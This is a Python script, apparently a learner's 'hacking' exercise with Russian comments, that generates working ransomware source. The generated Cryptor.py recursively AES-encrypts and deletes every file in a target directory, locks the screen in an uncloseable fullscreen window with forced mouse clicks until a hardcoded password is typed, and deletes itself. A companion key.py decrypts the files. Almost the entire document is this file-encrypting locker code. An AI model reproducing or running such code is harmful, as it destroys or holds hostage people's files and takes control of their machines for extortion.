direct = "D:/PythonProjects/PythonLearn/hacking/TEST"
password = "password"
pasw = "payday2"

with open("Cryptor.py", "w", encoding="utf-8") as crypt:
    crypt.write(f"""
import os, sys
from threading import *
import pyAesCrypt
from tkinter import Tk, Entry, Label
from pyautogui import click, moveTo
from time import sleep
def locker():
    def callback(event):
        global k, entry
        if entry.get() == '{pasw}':
            k = True
    
    def on_closing():
        click(675, 420)
        moveTo(675, 420)
        root.attributes("-fullscreen", True)
        root.protocol("WM_DELETE_WINDOW", on_closing) #Закрытие окна работать не будет
        root.update() #Обновление программы для статичности
        root.bind("<Control-KeyPress-c>", callback) #Событие, если мы нажимаем ctrl-c
    
    global k, entry #!!!!!
    root = Tk() #Создание окна
    root.title("Locker") #Заголовок
    root.attributes("-fullscreen", True) #Программа будет открыта в полный экран
    
    entry = Entry(root, font=1) #Entry - окно ввода
    entry.place(width=150, height=50, x=600, y=400) #Размещение на координаты и размеры
    
    label0 = Label(root, text="Locker by KirillhacT", font=1) #Необязательная надпись
    label0.grid(row=0, column=0) #Расположение надписи
    
    label1 = Label(root, text="Write the password and press Ctrl-C", font="Arial 20")
    label1.place(x=470, y=300) #Координаты второй надписи
    
    root.update() #Обновление экрана программы
    sleep(0.2)
    click(675, 420)
    k = False
    
    while not k:
        on_closing()

def crypter():
    def crypt(file):
        print("------------------------------------")
        password = '{password}'
        buffer_size = 512 * 1024
        pyAesCrypt.encryptFile(str(file), str(file)+".crp", password, buffer_size)
        print("[crypted] " + str(file) + ".crp")
        os.remove(file)
    
    def walk(dir):
        for name in os.listdir(dir): #Пробегает по списку файлов в дериктории
            path = os.path.join(dir, name) #Создает полный путь до текущего файла
            #Пример - D:/PythonProjects/PythonLearn/hacking/TEST/test.py
            if os.path.isfile(path):
                crypt(path)
            else:
                walk(path) #Если файл является дерикторией, то рекурсивно пробегает внутрь
    walk('{direct}')
    print("------------------------------------")
    os.remove(str(sys.argv[0]))
thread1 = Thread(target=locker)
thread2 = Thread(target=crypter)

thread1.start()
thread2.start()

thread1.join()
thread2.join()""")
    print(f"[+] file Crypto.py successfully saved!")

with open("key.py", "w", encoding="utf-8") as key:
    key.write(f"""
import os, sys
def decrypt(file):
    import pyAesCrypt
    print("------------------------------------")
    password = '{password}'
    buffer_size = 512 * 1024
    pyAesCrypt.decryptFile(str(file), str(os.path.splitext(file)[0]), password, buffer_size)
    print("[decrypted] " + str(os.path.splitext(file)[0]))
    os.remove(file)

def walk(dir):
    for name in os.listdir(dir):
        path = os.path.join(dir, name)
        if os.path.isfile(path):
            try:
                decrypt(path)
            except Exception as ex:
                pass
        else:
            walk(path)

walk('{direct}')
print("------------------------------------")
os.remove(str(sys.argv[0]))""")
    print(f"[+] file key.py successfully saved!")


